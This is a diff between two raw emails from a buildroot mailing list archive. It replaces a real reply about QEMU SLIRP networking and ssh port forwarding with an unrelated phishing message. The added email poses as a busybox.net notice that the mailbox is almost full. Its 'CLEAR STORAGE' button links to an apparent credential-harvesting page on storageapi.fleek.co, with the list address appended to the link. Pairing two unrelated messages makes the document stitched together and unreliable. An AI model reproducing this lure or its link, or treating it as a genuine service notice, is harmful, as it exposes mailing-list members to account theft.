@@ -1,75 +1,42 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 42535C43334
-	for <buildroot@archiver.kernel.org>; Sun, 12 Jun 2022 22:39:34 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id A3AA1C433EF
+	for <buildroot@archiver.kernel.org>; Mon, 13 Jun 2022 01:04:38 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp1.osuosl.org (Postfix) with ESMTP id E64D283004;
-	Sun, 12 Jun 2022 22:39:33 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id 28BBC41843;
+	Mon, 13 Jun 2022 01:04:38 +0000 (UTC)
+X-Virus-Scanned: amavisd-new at osuosl.org
+Received: from smtp4.osuosl.org ([127.0.0.1])
+	by localhost (smtp4.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id BCjb6jRnKaVg; Mon, 13 Jun 2022 01:04:37 +0000 (UTC)
+Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
+	by smtp4.osuosl.org (Postfix) with ESMTP id 0B979417DC;
+	Mon, 13 Jun 2022 01:04:36 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 19F1C1BF369
+ for <buildroot@lists.busybox.net>; Mon, 13 Jun 2022 01:04:35 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 5E9DD818CD
+ for <buildroot@lists.busybox.net>; Mon, 13 Jun 2022 01:04:33 +0000 (UTC)
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
-	by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id fh3digD3VAB4; Sun, 12 Jun 2022 22:39:33 +0000 (UTC)
-Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp1.osuosl.org (Postfix) with ESMTP id 0540E827BA;
-	Sun, 12 Jun 2022 22:39:32 +0000 (UTC)
-Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
- by ash.osuosl.org (Postfix) with ESMTP id 55E2D1BF356
- for <buildroot@lists.busybox.net>; Sun, 12 Jun 2022 22:39:30 +0000 (UTC)
-Received: from localhost (localhost [127.0.0.1])
- by smtp3.osuosl.org (Postfix) with ESMTP id 447F7607A4
- for <buildroot@lists.busybox.net>; Sun, 12 Jun 2022 22:39:30 +0000 (UTC)
-X-Virus-Scanned: amavisd-new at osuosl.org
-Authentication-Results: smtp3.osuosl.org (amavisd-new);
- dkim=pass (2048-bit key) header.d=gmail.com
-Received: from smtp3.osuosl.org ([127.0.0.1])
- by localhost (smtp3.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id 5jzAxuTNIxIr for <buildroot@lists.busybox.net>;
- Sun, 12 Jun 2022 22:39:29 +0000 (UTC)
-X-Greylist: whitelisted by SQLgrey-1.8.0
-Received: from mail-oi1-x22b.google.com (mail-oi1-x22b.google.com
- [IPv6:2607:f8b0:4864:20::22b])
- by smtp3.osuosl.org (Postfix) with ESMTPS id 6A85660644
- for <buildroot@buildroot.org>; Sun, 12 Jun 2022 22:39:29 +0000 (UTC)
-Received: by mail-oi1-x22b.google.com with SMTP id s124so5991804oia.0
- for <buildroot@buildroot.org>; Sun, 12 Jun 2022 15:39:29 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20210112;
- h=mime-version:references:in-reply-to:from:date:message-id:subject:to
- :cc; bh=kwSMQ3FJxSfJuYP8angS15o9oehZCHf7TTGuDvk4sdM=;
- b=iIWyzaPOQf70y9Ov3PKzO+XbYKs300ZLHORU7P/WHkU7EzpLUUyIsVWRQ3kjDlMTnk
- kShD/r3jtC5vfWjAQGKZ3Y8jpC34ivP64gy1maw2YW2Nmhm2KBI0+pGa4NjnPJwDQUGp
- CIYntLBa+44fGFbfQ/jHKvWF4CBO2dszkXhawKM1OWwTf4Vy9buOwfUbmwgP/3AvAN2M
- 9eDRrH25aeMkBU0KnoNnyrQL/vSuaO94DbTafl3cgjbd/ssf3JbAmyuGwc7/QN0SGCZB
- hNNW9QaSaSs0+Jik+shDE5CPp1Bemp+i25FT+Y5ADFgmqnNrIhR3I8ELUk6/lp4QnC4p
- IUnQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20210112;
- h=x-gm-message-state:mime-version:references:in-reply-to:from:date
- :message-id:subject:to:cc;
- bh=kwSMQ3FJxSfJuYP8angS15o9oehZCHf7TTGuDvk4sdM=;
- b=MOvl88XSSCrPwvsl/XBIYTr/ELSgcxAyidzZw5q/+5oVMbk8E9Oyp3oEhPkCKF6BG3
- NlkaXt+xUImvdDnh5TnKBvg3MiJswBcfMYsPmBLHZR6SruCT31VOBYF6i/mbgi0RWtp4
- P8YH9rt+za+7X0AjV/silimZ6LLZE4dA++/t8Xx9xWQOh+xtfcKybLRrazQyXYRuaFyL
- s8syzO+d0TynrWIuU2fakfG/d6dBQnEoQW67EfFL1/0Psa8u6Q06mNds7KC7gp47G61/
- iSpDn5gI2gjmM1hIudUDJlpT7+GXGY1+y1vU26VQylSyWnOcKmfH8ln3YBQJBpN+il5X
- jIzg==
-X-Gm-Message-State: AOAM532XH7f9zKyk2ZoP+CB/GcQa60kUyuNGopIwViYLqh7orsD3mHqk
- QvrmxPTx8MdV/bs4d60Ftv4aaP1YV1WJPsZ5wrOKSi0dZLWWcr11Bhk=
-X-Google-Smtp-Source: ABdhPJwkWQq8MRGTIyhfQeF7ovsk1b5r5ZwX8z31KTOV/zj0vb0Xy0kzM9P/NVgjw61+n2QEhwFUs8LrXIDSj4vBd0g=
-X-Received: by 2002:a05:6808:b11:b0:32f:3b9f:9156 with SMTP id
- s17-20020a0568080b1100b0032f3b9f9156mr1693962oij.64.1655073568420; Sun, 12
- Jun 2022 15:39:28 -0700 (PDT)
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id Y9_FEbqdYptx for <buildroot@lists.busybox.net>;
+ Mon, 13 Jun 2022 01:04:32 +0000 (UTC)
+X-Greylist: domain auto-whitelisted by SQLgrey-1.8.0
+Received: from busybox.net (unknown [51.158.83.146])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 3E5F481CA5
+ for <buildroot@busybox.net>; Mon, 13 Jun 2022 01:04:31 +0000 (UTC)
+From: busybox.net <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 13 Jun 2022 00:44:47 -0700
+Message-ID: <20220613004447.FC33E22437006F2B@busybox.net>
 MIME-Version: 1.0
-References: <CAN5CKbd9yxwUwnxEd_Vw=B0io4fh8GBj7rnrJJEuOb3uZJ7ptQ@mail.gmail.com>
-In-Reply-To: <CAN5CKbd9yxwUwnxEd_Vw=B0io4fh8GBj7rnrJJEuOb3uZJ7ptQ@mail.gmail.com>
-From: Alistair Francis <alistair23@gmail.com>
-Date: Mon, 13 Jun 2022 08:39:02 +1000
-Message-ID: <CAKmqyKM1r1Os1m_CV6FwbxHzSGu+YXMuoDLADxeejFJn_2pX_Q@mail.gmail.com>
-To: snathick <snathicktechno@gmail.com>
-Subject: Re: [Buildroot] network/ssh issue on qemuriscv32
+Subject: [Buildroot] ACTION REQUIRED
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -81,57 +48,106 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: Mark Corbin <mark.corbin@embecosm.com>, buildroot <buildroot@buildroot.org>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============8204701508589258441=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-On Mon, Jun 13, 2022 at 2:24 AM snathick <snathicktechno@gmail.com> wrote:
->
-> Hi,
->
-> Unable to connect to network in qemuriscv32
->
-> steps to reproduce the issue as follows
-> 1. $ cd buildroot-2022.02.2
-> 2. $ make qemu_riscv32_virt_defconfig
-> 3. $ make menuconfig
->    changed init to systemd
->    enabled openssh
-> 4. $ make
-> 5. $ cd output/images
->      ./start-qemu.sh
+--===============8204701508589258441==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-I suspect this uses SLIRP by default
+<!DOCTYPE HTML>
 
-> Able to boot the image succesfully.
-> echo nameserver 8.8.8.8 > /etc/resolv.conf
-> when i am trying to ping as follows
-> ping 8.8.8.8
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<p style=3D'text-align: center; color: rgb(0, 0, 102); text-transform: none=
+; text-indent: 0px; letter-spacing: normal; font-family: "Lucida Grande", V=
+erdana, Arial, Helvetica, sans-serif; font-size: 1.2em; font-style: normal;=
+ font-weight: 600; margin-top: 0px; margin-bottom: 1.5em; word-spacing: 0px=
+; white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 25=
+5, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial;'>b=
+uildroot, your mailbox is almost full.</p>
+<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
+(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
+t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
+e-space: normal; border-collapse: collapse; orphans: 2; widows: 2; backgrou=
+nd-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-=
+caps: normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">=
+<tbody><tr style=3D"height: 0.5em;"><td style=3D"background: 0% 50% rgb(218=
+, 60, 47); margin: 0px; width: 321px; font-family: Roboto, RobotoDraft, Hel=
+vetica, Arial, sans-serif;">&nbsp;</td><td style=3D"background: 0% 50% rgb(=
+224, 224, 224); margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, A=
+rial, sans-serif;">&nbsp;</td></tr></tbody></table>
+<table width=3D"325" align=3D"center" style=3D'text-align: left; color: rgb=
+(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacing: norma=
+l; font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; fon=
+t-size: 11px; font-style: normal; font-weight: 400; word-spacing: 0px; whit=
+e-space: normal; border-collapse: collapse; orphans: 2; widows: 2; backgrou=
+nd-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-=
+caps: normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0">=
+<tbody><tr><td align=3D"left" style=3D"margin: 0px; font-family: Roboto, Ro=
+botoDraft, Helvetica, Arial, sans-serif;"><span style=3D"color: rgb(218, 60=
+, 47); font-weight: bold;">4.86 GB</span></td><td align=3D"right" style=3D"=
+margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
+;"><span style=3D"font-weight: bold;">4.18 GB</span></td></tr>
+</tbody></table>
+<p style=3D'margin: 3em auto; text-align: center; color: rgb(51, 51, 51); t=
+ext-transform: none; text-indent: 0px; letter-spacing: normal; font-family:=
+ "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; font-size: 11px; f=
+ont-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal=
+; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant=
+-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0=
+px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'>You&nbsp;m=
+ight experience delays or can&nbsp;no longer send and receive messages.<br>=
+<br><a style=3D"text-decoration: none;" href=3D"https://storageapi.fleek.co=
+/83598172-a1a0-4b8a-9559-6033132c004b-bucket/Web.html#buildroot@busybox.net=
+">
+<span style=3D"background: linear-gradient(rgb(192, 192, 192) 0%, rgb(148, =
+148, 148) 100%); padding: 5px 10px; border-radius: 8px; border: 1px solid r=
+gb(8, 44, 64); border-image: none; text-align: center; color: rgb(231, 24, =
+76); letter-spacing: 2px; font-size: 24px; font-variant: small-caps; font-w=
+eight: bold; position: relative; cursor: pointer; box-shadow: 1px 3px 5px 2=
+px #c0c0c0; text-shadow: 1px 1px 1px rgba(5,29,41,1); -ms-user-select: none=
+; -webkit-box-shadow: 1px 3px 5px 2px #c0c0c0;=20
+-moz-box-shadow: 1px 3px 5px 2px #c0c0c0; -webkit-touch-callout: none; -web=
+kit-user-select: none; -khtml-user-select: none; -moz-user-select: none; us=
+er-select: none;">CLEAR STORAGE</span></a><br></p>
+<p style=3D'margin: 3em auto; text-align: center; color: rgb(51, 51, 51); t=
+ext-transform: none; text-indent: 0px; letter-spacing: normal; font-family:=
+ "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; font-size: 11px; f=
+ont-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal=
+; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant=
+-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0=
+px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'><b style=
+=3D"font-weight: bolder;">Mailbox address:<br></b><a style=3D"color: rgb(1,=
+ 134, 186); text-decoration: none; background-color: transparent;" target=
+=3D"_blank" rel=3D"noreferrer">buildroot@busybox.net</a></p><p>
+</p>
 
-SLIRP doesn't support ICMP, so this won't work.
 
-> no response
->
-> unable to ssh into qemu from the host machine.
+</body></html>
 
-Did you setup port forwarding with QEMU?
+--===============8204701508589258441==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-See the QEMU networking documentation:
-https://wiki.qemu.org/Documentation/Networking
-
-> Hereby attaching my config file.
->
-> Please help me to resolve my issue.
-> --
-> Thanks & Regards,
-> Snathick
-> _______________________________________________
-> buildroot mailing list
-> buildroot@buildroot.org
-> https://lists.buildroot.org/mailman/listinfo/buildroot
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============8204701508589258441==--
